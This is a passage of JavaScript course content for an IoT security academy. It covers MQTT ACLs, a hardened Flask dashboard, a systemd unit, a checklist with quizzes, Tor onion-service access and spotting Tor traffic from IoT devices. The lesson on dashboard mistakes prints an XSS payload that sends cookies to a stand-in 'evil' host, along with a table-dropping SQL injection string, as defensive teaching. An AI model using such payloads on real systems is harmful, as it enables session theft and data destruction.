            ['For looks', 'So they match one generic ACL `pattern … home/%u/…`, so each device writes only to its own topics', 'Because TLS requires it', 'To make them shorter'], 1,
            'This way one ACL line covers **all** the sensors, and none can "impersonate" another.'),
        ],
      },
      {
        id: 'iot-9-2', title: 'Broker and a secure dashboard on the Pi', minutes: 25,
        goal: 'Finish the Pi: the final ACL, a Python **dashboard** (paho → SQLite → Flask) free of XSS and SQL injection, running as a **hardened systemd service**, reachable only through an SSH tunnel.',
        blocks: [
          code('text', '/etc/mosquitto/acl (final)', R`
# All sensors: only their own topics
pattern write home/%u/state
pattern write home/%u/status
pattern write home/%u/heartbeat
pattern read  home/%u/cmd

user dashboard
topic read home/+/state
topic read home/+/status

user monitor
topic read  home/#
topic write alerts/#

# You, from the laptop, for commands
user maria
topic readwrite home/#
topic read alerts/#
`, L(
            '- The `pattern` lines apply to everyone: each `sensorXX` writes only under `home/sensorXX/`.',
            '- `dashboard` **only reads**. If the dashboard is compromised, it cannot send commands.',
            '- Only `maria` (you) writes to `cmd`. No sensor sends commands to another.',
            '- Remember: `sudo systemctl reload mosquitto` after a change.'
          )),
          text(
            '### The dashboard: two classic mistakes',
            'The data in the dashboard comes from devices, so it is **not trusted**. If a device is compromised, it will send whatever it wants.'
          ),
          code('python', '❌ XSS and SQL injection', R`
# ❌ SQL injection: the device comes from the topic (that is, from the network)
con.execute(f"INSERT INTO readings VALUES ({time.time()}, '{device}', {t}, {h})")

# ❌ XSS: HTML with an f-string. If the device sends a name/value like
#    <script>fetch('//evil/'+document.cookie)</script>  → it runs in your browser
html = f"<tr><td>{device}</td><td>{t}</td></tr>"
`, L(
            '- **SQL injection:** a device name such as `x\', 0, 0); DROP TABLE readings; --` changes the SQL.',
            '- **XSS:** anything that goes into HTML without escaping can become JavaScript code in your own browser.',
            '- The fix for both: **never** build SQL/HTML by joining strings. Parameters for SQL, templates with autoescape for HTML.'
          )),
          code('python', '✅ /opt/iotdash/dashboard.py', R`
#!/usr/bin/env python3
"""IoT dashboard: MQTT/TLS → SQLite → Flask (127.0.0.1 only)."""
import json
import os
import re
import sqlite3
import ssl
import time
import paho.mqtt.client as mqtt
from flask import Flask, render_template_string

DB = os.path.join(os.environ.get("STATE_DIRECTORY", "/var/lib/iotdash"), "data.db")
BROKER, CA = "pi-broker.local", "/etc/mosquitto/certs/ca.crt"
DEVICE_RE = re.compile(r"^[a-z0-9_-]{1,32}$")


def db():
    con = sqlite3.connect(DB, timeout=5)
    con.execute("CREATE TABLE IF NOT EXISTS readings (ts REAL, device TEXT, t REAL, h REAL)")
    return con


def valid(d):
    return (isinstance(d, dict)
            and isinstance(d.get("t"), (int, float)) and -40 <= d["t"] <= 80
            and isinstance(d.get("h"), (int, float)) and 0 <= d["h"] <= 100)


# ---------- MQTT ----------
def on_connect(c, userdata, flags, rc, props):
    if rc.is_failure:
        print("MQTT failure:", rc)
        return
    c.subscribe("home/+/state", qos=1)


def on_message(c, userdata, msg):
    parts = msg.topic.split("/")
    if len(parts) != 3 or not DEVICE_RE.match(parts[1]) or len(msg.payload) > 256:
        return                                           # reject anything odd
    try:
        d = json.loads(msg.payload)
    except ValueError:
        return
    if not valid(d):
        return
    con = db()
    with con:                                            # automatic commit
        con.execute("INSERT INTO readings VALUES (?, ?, ?, ?)",   # ✅ parameters
                    (time.time(), parts[1], float(d["t"]), float(d["h"])))
    con.close()


client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="dashboard")
client.username_pw_set("dashboard", os.environ["MQTT_PASS"])
client.tls_set(ca_certs=CA, cert_reqs=ssl.CERT_REQUIRED)
client.on_connect, client.on_message = on_connect, on_message
client.connect(BROKER, 8883, keepalive=60)
client.loop_start()

# ---------- Web ----------
app = Flask(__name__)
PAGE = """<!doctype html><html lang="en"><meta charset="utf-8">
<meta http-equiv="refresh" content="30"><title>IoT</title>
<style>body{font-family:sans-serif;background:#0b111c;color:#cfe0f5}td,th{padding:6px 12px}</style>
<h1>🌡️ Sensors</h1>
<table><tr><th>Device</th><th>°C</th><th>%RH</th><th>Last reading</th></tr>
{% for dev, t, h, ts in rows %}
<tr><td>{{ dev }}</td><td>{{ '%.1f' % t }}</td><td>{{ '%.0f' % h }}</td><td>{{ ts }}</td></tr>
{% endfor %}
</table></html>"""


@app.after_request
def headers(resp):
    resp.headers["Content-Security-Policy"] = "default-src 'none'; style-src 'unsafe-inline'"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["X-Frame-Options"] = "DENY"
    return resp


@app.route("/")
def index():
    con = db()
    rows = con.execute(
        "SELECT device, t, h, datetime(MAX(ts), 'unixepoch', 'localtime') "
        "FROM readings GROUP BY device ORDER BY device").fetchall()
    con.close()
    return render_template_string(PAGE, rows=rows)      # ✅ Jinja2 autoescape


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8080)                 # ✅ local ONLY
`, L(
            '- `STATE_DIRECTORY`: systemd automatically provides the folder defined by `StateDirectory=` (see the unit below).',
            '- `DEVICE_RE`: the device name must match a strict pattern. Anything else is rejected before it reaches the database.',
            '- `len(msg.payload) > 256`: a size limit before `json.loads`.',
            '- `valid()`: types **and** physical limits. A compromised ESP32 cannot write "300°C" into the history.',
            '- `VALUES (?, ?, ?, ?)`: SQL **parameters**. The database treats them as data, never as code.',
            '- `render_template_string`: Flask\'s Jinja2 does **autoescape** on `{{ }}`, so `<script>` shows up as text.',
            '- **Security headers**: the CSP `default-src \'none\'` forbids every script, even if an XSS ever slips through.',
            '- `host="127.0.0.1"`: the dashboard is not reachable from the network, only through an SSH tunnel.'
          )),
          code('bash', 'Install as a service with its own user', R`
# A system user with no shell and no home
sudo useradd --system --no-create-home --shell /usr/sbin/nologin iotdash

sudo mkdir -p /opt/iotdash
sudo python3 -m venv /opt/iotdash/venv
sudo /opt/iotdash/venv/bin/pip install "paho-mqtt>=2.0" flask
sudo cp dashboard.py /opt/iotdash/

# The dashboard's MQTT password in a file only root can read (systemd passes it on)
echo "MQTT_PASS=the-dashboard-password" | sudo tee /etc/iotdash.env >/dev/null
sudo chmod 600 /etc/iotdash.env
`, L(
            '- `--system --shell /usr/sbin/nologin`: an account just for the service. Nobody logs in as `iotdash`.',
            '- The code in `/opt/iotdash` belongs to root: the service **cannot** change itself.',
            '- `/etc/iotdash.env` with 600: systemd reads it as root and passes the variable to the service.'
          )),
          code('text', '/etc/systemd/system/iotdash.service', R`
[Unit]
Description=IoT dashboard (MQTT → SQLite → Flask)
After=network-online.target mosquitto.service
Wants=network-online.target

[Service]
User=iotdash
Group=iotdash
EnvironmentFile=/etc/iotdash.env
ExecStart=/opt/iotdash/venv/bin/python /opt/iotdash/dashboard.py
Restart=on-failure
RestartSec=5

# --- Hardening ---
StateDirectory=iotdash
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
PrivateTmp=yes
PrivateDevices=yes
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectControlGroups=yes
RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX
CapabilityBoundingSet=
LockPersonality=yes
MemoryDenyWriteExecute=yes

[Install]
WantedBy=multi-user.target
`, L(
            '- `User=iotdash`: no root.',
            '- `StateDirectory=iotdash`: systemd creates `/var/lib/iotdash` owned by `iotdash`, and it is the **only** folder it can write to (because of `ProtectSystem=strict`).',
            '- `ProtectHome`, `PrivateTmp`, `PrivateDevices`: it cannot see home folders, the shared /tmp, or devices.',
            '- `CapabilityBoundingSet=` (empty): no special kernel capabilities.',
            '- `RestrictAddressFamilies`: only IP and Unix sockets (no raw/packet sockets).',
            '- See how "closed" it is: `systemd-analyze security iotdash` (lower score = better).'
          )),
          code('bash', 'Start and access', R`
sudo systemctl daemon-reload
sudo systemctl enable --now iotdash
systemctl status iotdash --no-pager
systemd-analyze security iotdash | tail -1

# From the laptop: tunnel, then open http://127.0.0.1:8080
ssh -N -L 8080:127.0.0.1:8080 maria@pi-broker.local
`, L(
            '- `systemd-analyze security`: an exposure score for the service. Compare before and after hardening.',
            '- The tunnel is the **only** door to the dashboard. Without your SSH key, nobody sees it.'
          )),
          tip('Want to see it from your phone away from home? **No** port forwarding. Put **WireGuard/Tailscale** on the Pi and the phone, and open the tunnel through the VPN.'),
          quiz('A compromised device sends `{"t": 22, "h": 50}` to the topic `home/<script>alert(1)</script>/state`. What happens in the dashboard?',
            ['The script runs', 'It is rejected by `DEVICE_RE`; and if it got through, autoescape and the CSP would stop it. Besides, the ACL does not let a device write to another topic', 'The database is wiped', 'The broker crashes'], 1,
            'Three layers: ACL on the broker, validation on input, escaping/CSP on output. None is enough on its own; together it is very hard for anything to get through.'),
          quiz('Why does the MQTT user `dashboard` have **only** `read`?',
            ['For speed', 'Least privilege: if the dashboard is compromised, it cannot send commands to the devices', 'Because Flask does not write', 'Because TLS requires it'], 1,
            'Every part gets **only** the permissions it needs. That limits the damage when something goes wrong.'),
        ],
      },
      {
        id: 'iot-9-3', title: 'Security checklist and the final test', minutes: 20,
        goal: 'Check your system with a **checklist** that maps to the OWASP IoT Top 10 and test what you learned with **12 questions**.',
        blocks: [
          text(
            'Go through the checklist below on **your own** system. Every "no" is a concrete job for next weekend.'
          ),
          table(['✓', 'Check', 'How to confirm', 'OWASP'], [
            ['☐', 'No default user/password (pi, admin)', '`getent passwd pi`, device settings', 'I1'],
            ['☐', 'SSH with keys only, no root', '`sudo sshd -T | grep -Ei \'passwordauth|permitroot\'`', 'I1, I2'],
            ['☐', 'Firewall: deny incoming, only 22 and 8883 from LAN/IoT', '`sudo ufw status verbose` or `nft list ruleset`', 'I2'],
            ['☐', 'fail2ban active', '`sudo fail2ban-client status sshd`', 'I2'],
            ['☐', 'Automatic updates', '`unattended-upgrade --dry-run --debug`', 'I4, I5'],
            ['☐', 'Only the necessary services', '`sudo ss -tulpn`', 'I2, I9'],
            ['☐', 'Mosquitto: no anonymous, password_file, ACL', '`mosquitto_pub` without a password → not authorised', 'I3, I9'],
            ['☐', 'MQTT only over TLS on the network (1883 on localhost only)', '`ss -tlnp | grep mosquitto`, `openssl s_client`', 'I7'],
            ['☐', 'ESP32: `setCACert`, **never** `setInsecure`', '`grep -rn setInsecure` in the code', 'I7'],
            ['☐', 'No secrets in Git', '`git log --all -- secrets.h`, `git grep -i pass`', 'I1'],
            ['☐', 'One MQTT user per device', 'The `passwd` file has one user per ESP32', 'I1, I8'],
            ['☐', 'Input validation in every callback', 'Length limits, command whitelist', 'I3'],
            ['☐', 'OTA: off, or with a password/time window, or HTTPS + signature', 'nmap port 3232', 'I4'],
            ['☐', 'Debug logs off in production', 'Serial monitor: prints no secrets', 'I9'],
            ['☐', 'Secure Boot + Flash Encryption (for exposed devices)', '`espefuse.py summary`', 'I10'],
            ['☐', 'JTAG/UART download disabled or secured', '`espefuse.py summary | grep -i jtag`', 'I10'],
            ['☐', 'IoT on a separate network, IoT → LAN blocked', 'From the ESP32/IoT network try to connect to your laptop', 'I2'],
            ['☐', 'UPnP off on the router', '`upnpc -l` with no mappings', 'I9'],
            ['☐', 'Heartbeat + monitor + alerts', 'Unplug an ESP32 → alert in ~3 minutes', 'I8'],
            ['☐', '`ca.key` and the signing key are offline with a backup', 'They are not on the Pi', 'I7, I10'],
          ]),
          nw('pentest', 'Run the LAN scanner in NetWatch\'s **🔴 Pentest** tab on your own network. Ideally the Pi shows only SSH (22) and MQTT/TLS (8883), and the ESP32s show no open ports.'),
          tip('Repeat the checklist **every time** you add a device or change something. Security is not a state, it is a habit.'),
          text('### Final test'),
          quiz('1. What was Mirai\'s main "weapon"?',
            ['A zero-day vulnerability in Linux', 'Telnet with factory-default passwords', 'Phishing emails', 'A vulnerability in TLS'], 1,
            'Plain default credentials on Telnet. That is why I1 is first in the OWASP IoT Top 10.'),
          quiz('2. In `sshd_config`, which combination completely turns off password login?',
            ['`PermitRootLogin no`', '`PasswordAuthentication no` and `KbdInteractiveAuthentication no`', '`MaxAuthTries 3`', '`X11Forwarding no`'], 1,
            'Both password methods must be turned off. Confirm with `sshd -T`.'),
          quiz('3. Mosquitto 2.x with `listener 8883` and no `allow_anonymous` setting at all. Does it accept anonymous clients?',
            ['Yes', 'No: in 2.x, once you define a listener, `allow_anonymous` defaults to `false`', 'Only with TLS', 'Only from localhost'], 1,
            'Mosquitto 2.0 changed the defaults to "secure by default". We write it explicitly anyway.'),
          quiz('4. What does `net.setInsecure()` do on `WiFiClientSecure`?',
            ['Turns encryption off', 'Encrypts, but does not check the server\'s certificate: open to MITM', 'Makes TLS faster and safer', 'Enables TLS 1.3'], 1,
            'Encryption without authentication = you talk encrypted to… whoever happens to be in the middle.'),
          quiz('5. Which field of the certificate do modern clients check for the server\'s name?',
            ['The CN', 'The SAN (subjectAltName)', 'The serial number', 'The date'], 1,
            'If the name or IP you give to `connect()` is not in the SAN, the connection fails.'),
          quiz('6. In the PubSubClient callback, which is correct?',
            ['`strcpy(buf, (char*)payload)`', 'Check `length < sizeof(buf)`, `memcpy`, and `buf[length] = \'\\0\'`', '`Serial.println((char*)payload)`', '`String s = (char*)payload;`'], 1,
            'The payload does not end in `\\0`. Always go by `length` and with a limit.'),
          quiz('7. What does Flash Encryption protect?',
            ['Which firmware runs', 'The confidentiality of data in flash (passwords, keys) against a dump', 'Wi‑Fi traffic', 'MQTT'], 1,
            'For which firmware runs you need Secure Boot. Use both together.'),
          quiz('8. Why do eFuses need great care?',
            ['They are expensive', 'They are written once: a wrong setting or a lost key can make the chip permanently useless', 'They are erased on every reboot', 'They need Internet'], 1,
            'Test on a "sacrificial" board, back up the keys, Development mode first.'),
          quiz('9. Which OTA security layer proves **who** built the firmware?',
            ['The ArduinoOTA password', 'HTTPS', 'The image\'s digital signature', 'The SHA-256 digest'], 2,
            'Only a signature made with a key that you hold proves origin. HTTPS protects the transfer, the digest protects integrity.'),
          quiz('10. With IoT on a separate network and a rule IoT → LAN = DROP, what do you achieve?',
            ['IoT devices are never compromised', 'A compromised device cannot attack the rest of the machines in the home (damage containment)', 'Faster Wi‑Fi', 'TLS is no longer needed'], 1,
            'Segmentation does not prevent compromise; it limits the **blast radius**.'),
          quiz('11. `arp_guard.py` alerts: "ARP SPOOF of the gateway". The ESP32s use MQTT/TLS with your own CA. What is the right assessment?',
            ['The attacker is reading all the MQTT data', 'The MQTT content is protected, but someone on the LAN is doing a MITM: find the device with the MAC from the alert and isolate it', 'It is a false positive, ignore it', 'You must turn TLS off'], 1,
            'TLS does its job, but ARP spoofing means **something** on the network is hostile. Detection tells you to go looking.'),
          quiz('12. Which of the following is **not** good practice for the dashboard?',
            ['Bind to 127.0.0.1 and access via an SSH tunnel', 'SQL with `?` parameters', 'HTML built with f-strings from MQTT data', 'A systemd service with its own user and `ProtectSystem=strict`'], 2,
            'HTML built by joining strings from untrusted data = XSS. Always use templates with autoescape.'),
          quiz('13. (Bonus) You found your CA\'s `ca.key` in `/home/maria/iot-ca` on the Pi broker. What do you do?',
            ['Nothing, it has a password', 'Move it to offline media (with a backup) and securely delete it from the Pi (`shred -u`)', 'chmod 777 it', 'Upload it to Git for backup'], 1,
            'Even with a password, you do not want your most valuable key on the most exposed machine. If the Pi is stolen, the thief has all the time in the world to "crack" the password.'),
          text(
            '### 🎉 Congratulations!',
            'You started from "what is IoT" and reached a system with hardening, TLS with your own CA, ACLs, segmentation, monitoring and secure firmware. That is **better** than most commercial IoT devices.',
            '',
            '**Next steps:**',
            '- **Mutual TLS** (client certificates per ESP32) and dropping the MQTT passwords.',
            '- **Secure Boot + Flash Encryption** in release mode on a production board.',
            '- **WireGuard** for remote access with no open ports.',
            '- Your own detection rules in NetWatch\'s **🧩 Rules** tab for your IoT traffic.'
          ),
        ],
      },
    ],
  });

  // ====================================================================
  // MODULE 10 — Secure remote access
  // ====================================================================
  ACADEMY.scene('iot-tor-onion', {
    w: 640, h: 300, speed: 3000,
    intro: 'How you get from your phone to the Pi\'s dashboard through a **Tor onion service**, with **no** open port on your router. Each arrow is really a **Tor circuit** with 3 nodes.',
    nodes: [
      { id: 'you', x: 70, y: 70, icon: '📱', label: 'You\nTor Browser' },
      { id: 'hsdir', x: 300, y: 45, icon: '📒', label: 'HSDir\ndirectory' },
      { id: 'nat', x: 470, y: 75, icon: '🌐', label: 'Home router\n0 open ports' },
      { id: 'pi', x: 585, y: 165, icon: '🍓', label: 'Pi + tor\n127.0.0.1:8123' },
      { id: 'rp', x: 180, y: 200, icon: '🤝', label: 'Rendezvous\npoint' },
      { id: 'ip', x: 430, y: 215, icon: '🚪', label: 'Introduction\npoint' },
      { id: 'scan', x: 300, y: 270, icon: '🤖', label: 'Shodan / bot' },
    ],
    links: [['pi', 'nat'], ['nat', 'hsdir'], ['nat', 'ip'], ['you', 'hsdir'], ['you', 'rp'], ['scan', 'nat']],
    tables: [{ id: 'st', title: 'What holds right now', head: ['Step', 'State'], rows: [] }],
    steps: [
      { from: 'pi', via: ['nat'], to: 'ip', pkt: 'circuit ⇢', color: BLUE, mark: { pi: 'hl' }, table: { st: [['Pi → intro points', 'outbound circuits']] }, say: '`tor` on the Pi builds **outbound** circuits to a few **introduction points** and tells them "if someone asks about me, bring me the message". NAT does not get in the way: everything starts **from the inside**.' },
      { from: 'pi', via: ['nat'], to: 'hsdir', pkt: 'descriptor ✍️', color: PURP, table: { st: [['Pi → intro points', 'outbound circuits'], ['Descriptor', 'signed, encrypted']] }, say: 'It publishes a **descriptor** (which intro points to use) to the HSDir directories. It is signed with the `.onion` address\'s key and, with **client authorization**, encrypted only for your own keys.' },
      { from: 'you', to: 'hsdir', pkt: 'xyz…onion;', color: YEL, say: 'Your phone asks for the descriptor for the `.onion` address. You can read it only if you have the right **x25519 private key**.' },
      { from: 'you', to: 'rp', pkt: 'cookie', color: YEL, say: 'You pick a random node as the **rendezvous point** and leave it a secret **cookie**.' },
      { from: 'you', via: ['rp'], to: 'ip', pkt: 'INTRODUCE', color: YEL, say: 'You send the introduction point a message **encrypted for the Pi**: "meet me at that rendezvous, with this cookie".' },
      { from: 'ip', via: ['nat'], to: 'pi', pkt: 'INTRODUCE', color: BLUE, say: 'The intro point forwards it to the Pi over the circuit the **Pi had already opened**. No new inbound connection.' },
      { from: 'pi', via: ['nat'], to: 'rp', pkt: 'RENDEZVOUS', color: GREEN, mark: { rp: 'ok' }, say: 'The Pi builds a new circuit **to** the rendezvous point and hands over the cookie. The rendezvous joins the two circuits.' },
      { from: 'you', via: ['rp', 'nat'], to: 'pi', pkt: 'HTTP 🔒', color: GREEN, mark: { you: 'ok', pi: 'ok' }, table: { st: [['Connection', 'end-to-end encrypted, 6 hops'], ['Open ports on the router', '0']] }, say: 'Done: **end-to-end** encryption, ~6 nodes in the middle. None of them knows both who you are **and** where the Pi is. `tor` delivers the traffic to `127.0.0.1:8123`.' },
      { from: 'scan', to: 'nat', pkt: 'SYN :8123?', color: RED, drop: true, mark: { scan: 'bad', nat: 'ok' }, say: 'Shodan and botnets scan your public IP: **no** port answers. There is nothing for them to find or hit.' },
    ],
  });

  M.push({
    id: 'iot-10', order: 10, title: 'Secure remote access (no open ports)',
    desc: 'Why port forwarding is a bad idea, Tor onion services with client authorization, a comparison with WireGuard/Tailscale, and what it means when an IoT device talks to Tor.',
    lessons: [
      {
        id: 'iot-10-1', title: 'Access from outside without port forwarding: a Tor onion service', minutes: 22,
        goal: 'Understand why port-forwarding the dashboard is dangerous, how a **Tor onion service** works (introduction points, rendezvous, no open port), and set one up for the Pi with **client authorization**, so that **only you** get in.',
        blocks: [
          text(
            'You want to see the Pi\'s dashboard or Proxmox when you are away from home. The quickest way is a **port forwarding** rule on the router: `public IP:8123 → Pi:8123`. It is also the most **dangerous**.',
            '',
            '### Why port forwarding is a bad idea',
            '- Engines such as **Shodan** and **Censys** scan the **whole** IPv4 internet all the time. A new open port shows up in their listings within hours or days.',
            '- **Botnets** (such as Mirai and its descendants) automatically try default passwords and known exploits on every port that answers.',
            '- An IoT dashboard or the Proxmox web UI is **not** built to withstand the internet: one bug in the login page is enough.',
            '- If someone gets in, they are **inside** your LAN, next to all your other machines.'
          ),
          text(
            '### The idea of an onion service',
            'Instead of the world coming **to** the Pi, the Pi **goes out** to the Tor network and keeps circuits open. Anyone who knows the `.onion` address (and, in our case, has the **key**) meets the Pi at a neutral spot inside Tor.',
            '- **No inbound port**: your router has no forwarding rule at all.',
            '- **NAT does not matter**: it works even behind your ISP\'s CGNAT or a 4G router.',
            '- The `.onion` address (v3, 56 characters) is the service\'s own **public key**: nobody can "forge" it.'
          ),
          anim('iot-tor-onion', 'Introduction points, descriptor, rendezvous: the Pi never accepts an inbound connection from the internet.'),
          text(
            '### Step 1: the dashboard listens only on localhost',
            'First of all: the service you publish must listen **only** on `127.0.0.1`. Otherwise anyone on the LAN (or a compromised IoT device) gets in directly, without Tor and without a key.'
          ),
          code('bash', 'Which address is the dashboard listening on?', R`
sudo ss -tlnp | grep 8123
# GOOD:  LISTEN 0 128 127.0.0.1:8123 ...
# BAD:   LISTEN 0 128   0.0.0.0:8123 ...   (listens on the whole network)
`, L(
            '- `ss -tlnp`: TCP sockets in the LISTEN state, with the program that owns them.',
            '- If you see `0.0.0.0` or `*`, change your app\'s bind setting to `127.0.0.1` (e.g. `--host 127.0.0.1` in Flask/uvicorn).'
          )),
          text('### Step 2: install Tor and the onion service'),
          code('bash', 'Raspberry Pi OS / Debian', R`
sudo apt update
sudo apt install -y tor
sudo nano /etc/tor/torrc
`, L(
            '- The Debian `tor` package runs as a service with the user `debian-tor`.',
            '- For newer versions there is also the official `deb.torproject.org` repository.'
          )),
          code('text', '/etc/tor/torrc (addition)', R`
HiddenServiceDir /var/lib/tor/pi_dash/
HiddenServicePort 80 127.0.0.1:8123
`, L(
            '- `HiddenServiceDir`: the folder where `tor` keeps the service\'s **keys** and the `hostname` file. It creates it by itself, owned by `debian-tor` with permissions 700.',
            '- `HiddenServicePort 80 127.0.0.1:8123`: whoever opens `http://<address>.onion` (port 80) ends up at the Pi\'s `127.0.0.1:8123`.',
            '- New versions only create v3 onion services (56 characters). The old v2 ones have been retired.'
          )),
          code('bash', 'Restart and your address', R`
sudo -u debian-tor tor --verify-config
sudo systemctl restart tor
sudo cat /var/lib/tor/pi_dash/hostname
# e.g. abcdefghijklmnopqrstuvwxyz234567abcdefghijklmnopqrstuvwx.onion
`, L(
            '- `--verify-config`: checks the `torrc` before you apply it.',
            '- `hostname`: your service\'s `.onion` address.',
            '- Keep a **backup** of the `pi_dash/` folder (mainly `hs_ed25519_secret_key`): if you lose it, you lose the address. If it is stolen, someone else can "wear" it.'
          )),
          warn('Up to here, anyone who learns the `.onion` address reaches the dashboard\'s login page. The address is not a password. Add **client authorization**.'),
          text(
            '### Step 3: client authorization (only you)',
            'With client authorization, the service\'s descriptor is encrypted for specific **x25519** keys. Without the private key, the Tor client cannot even find the introduction points: the service looks like it **does not exist**.'
          ),
          code('bash', 'x25519 key pair for your phone (on the Pi)', R`
mkdir -p ~/onion-keys && chmod 700 ~/onion-keys && cd ~/onion-keys
openssl genpkey -algorithm x25519 -out phone.prv.pem
grep -v ' PRIVATE KEY' phone.prv.pem | base64 -d | tail -c 32 | base32 | sed 's/=//g' > phone.prv.key
openssl pkey -in phone.prv.pem -pubout | grep -v ' PUBLIC KEY' | base64 -d | tail -c 32 | base32 | sed 's/=//g' > phone.pub.key

# The server gets ONLY the public key
echo "descriptor:x25519:$(cat phone.pub.key)" | sudo tee /var/lib/tor/pi_dash/authorized_clients/phone.auth
sudo chown debian-tor:debian-tor /var/lib/tor/pi_dash/authorized_clients/phone.auth
sudo systemctl restart tor
`, L(
            '- `openssl genpkey -algorithm x25519`: a new key pair.',
            '- `base64 -d | tail -c 32 | base32`: keeps the key\'s 32 bytes and writes them in **base32** without `=`, as Tor wants them.',
            '- `authorized_clients/<name>.auth`: one file per client device, containing `descriptor:x25519:<public key>`. The folder already exists inside `HiddenServiceDir`.',
            '- As soon as **even one** `.auth` file exists, the service accepts **only** authorised clients.',
            '- To kick a device out (e.g. you lost your phone): delete its `.auth` and restart.'
          )),
          code('text', 'On the client (laptop with tor): torrc and key file', R`
# the client's torrc
ClientOnionAuthDir /var/lib/tor/onion_auth

# /var/lib/tor/onion_auth/pi.auth_private  (one line, permissions 600)
<56 characters of the .onion WITHOUT the .onion>:descriptor:x25519:<contents of phone.prv.key>
`, L(
            '- `ClientOnionAuthDir`: a folder with the private keys, one `*.auth_private` file per service.',
            '- In **Tor Browser** (desktop/Android) you do not need a torrc: when you open the address, it asks for the private key and you can save it.',
            '- `phone.prv.key` is a **secret**. Transfer it safely and then delete it from the Pi (`shred -u`).'
          )),
          tip('You can publish the Pi\'s SSH the same way: `HiddenServicePort 22 127.0.0.1:22`. You connect with `torsocks ssh pi@<address>.onion`. Your SSH keys apply as normal on top.'),
          text(
            '### Alternatives: WireGuard and Tailscale',
            'Tor is not the only solution. For everyday use, a **VPN** is often faster.'
          ),
          table(['', 'Port forwarding', 'Tor onion + client auth', 'WireGuard', 'Tailscale'], [
            ['Open port on the router', '✖ yes, TCP to the app', '✔ none', 'one UDP (e.g. 51820)', '✔ none (NAT traversal)'],
            ['Shows up in scans', '✖ yes', '✔ no', '✔ almost never (does not answer without the right key)', '✔ no'],
            ['Behind CGNAT / 4G', '✖ does not work', '✔ works', '✖ needs a public IP or a VPS', '✔ works (relay if needed)'],
            ['Speed / latency', 'fast', 'slow, hundreds of ms', 'very fast', 'very fast'],
            ['Dependence on third parties', '—', 'the Tor network', 'none', 'a Tailscale account (or self-hosted Headscale)'],
            ['Good for', 'nothing you care about', 'dashboard / SSH with no accounts and no public IP', 'full access to the LAN', 'easy setup across many devices'],
          ]),
          tip('Whatever you choose, keep the dashboard\'s **password/2FA** too. The onion service or VPN is the outer door; the password is the door of the room.'),
          quiz('Why does an onion service work even behind CGNAT, without port forwarding?',
            ['Because Tor opens ports on the router by itself with UPnP', 'Because all connections start **from the Pi outwards** (circuits to introduction and rendezvous points)', 'Because Tor uses IPv6', 'Because the ISP makes an exception for Tor'], 1,
            'The Pi never accepts an inbound connection from the internet. It builds outbound circuits, and the "meeting" happens at the rendezvous point inside Tor.'),
          quiz('You set up an onion service for the dashboard, but `ss -tlnp` shows `0.0.0.0:8123`. What is the problem?',
            ['None, Tor protects it', 'The dashboard is directly reachable from the whole LAN, without Tor and without client auth', 'The onion service will not work', 'Shodan will find it through Tor'], 1,
            'The onion service adds **one** route. It does not close the others. Bind to `127.0.0.1` so the only route is through Tor.'),
          quiz('What does the file `authorized_clients/phone.auth` on the server contain?',
            ['The phone\'s private key', '`descriptor:x25519:` and the phone\'s **public** key in base32', 'The .onion address', 'The dashboard password'], 1,
            'The server needs only **public** keys. The private one stays on the client (`*.auth_private` or in Tor Browser).'),
        ],
      },
      {
        id: 'iot-10-2', title: 'Tor on your network: friend or foe?', minutes: 15,
        goal: 'Tell **your own** Tor apart from suspicious Tor traffic, use the **exit node** and **relay** lists, and know why an IoT device talking to Tor is a **red flag**.',
        blocks: [
          text(
            'In the previous lesson Tor was **your tool**. Attackers use the same tool, for the same reason: to hide where they are. The question is not "Tor yes or no", but **which device** is talking to Tor and **why**.',
            '',
            '### Two directions, two lists',
            '- **Inbound from Tor**: someone connects to a service of yours (e.g. an open port, a honeypot) and their IP is a Tor **exit node**. You check with the **exit nodes** list.',
            '- **Outbound to Tor**: a device of **yours** connects to the Tor network. It first hits a **guard/relay** (not an exit). You check with the list of **all relays**, and with ports **9001** (ORPort) and **9030** (DirPort), the relay defaults.'
          ),
          code('bash', 'Tor lists (public, from the Tor Project)', R`
# 1) All exit nodes, one IP per line
curl -s https://check.torproject.org/torbulkexitlist -o tor-exits.txt
wc -l tor-exits.txt

# Is this IP an exit node?
grep -qx '185.220.101.4' tor-exits.txt && echo "Tor exit" || echo "not an exit"

# 2) All relays running now (for outbound traffic to Tor)
curl -s 'https://onionoo.torproject.org/details?running=true&fields=or_addresses' \
  | jq -r '.relays[].or_addresses[]' > tor-relays.txt
head tor-relays.txt     # e.g. 1.2.3.4:9001, [2001:db8::1]:443
`, L(
            '- `torbulkexitlist`: the official list of exit IPs. It is updated often: download it again regularly.',
            '- `grep -qx`: an exact match of the whole line, with no output, only a return code.',
            '- **Onionoo**: the Tor Project\'s service with data on all relays. `or_addresses` gives the IP:port of each relay.',
            '- It needs `jq` (`sudo apt install jq`).'
          )),
          warn('Do not rely on ports 9001/9030 **alone**. Many relays listen on **443** to look like HTTPS. The port is a hint; the relay list is proof.'),
          text(
            '### Why it is a red flag on an IoT device',
            'An ESP32 with a temperature sensor or an IP camera has **no reason at all** to talk to Tor. If it does, the most likely explanation is **malware**:',
            '- There are IoT botnets (e.g. variants of **Mirai**) that hide their **C2 server** (command and control) behind an onion service. The device connects to Tor to get its orders.',
            '- That way the C2 is hard to "take down": there is no IP or domain for anyone to block or seize.',
            '- The device may also be used as a **proxy** or for attacks on others.',
            '',
            'By contrast, Tor from **your own** laptop (Tor Browser) or from the Pi with the onion service from the previous lesson is expected. That is why you need an **inventory**: to know which device *should* talk to Tor.'
          ),
          table(['What you see', 'Assessment', 'What you do'], [
            ['Your laptop → 9001, while Tor Browser is running', 'expected', 'nothing'],
            ['The Pi with the onion service → relays', 'expected (you set it up)', 'note it in the inventory'],
            ['ESP32 / camera / smart plug → 9001 or an IP from the relay list', '**very suspicious**', 'isolate, reflash firmware, new passwords'],
            ['Inbound connection to the honeypot from an exit node', 'a scan/attack hiding its origin', 'block, and check what else is exposed'],
          ]),
          code('bash', 'Who is talking to Tor relays right now? (on the Pi or the router)', R`
# Connections of this very machine to 9001/9030
sudo ss -tnp state established '( dport = :9001 or dport = :9030 )'

# Traffic of other devices passing through here (e.g. the Pi as router/sensor of the IoT VLAN)
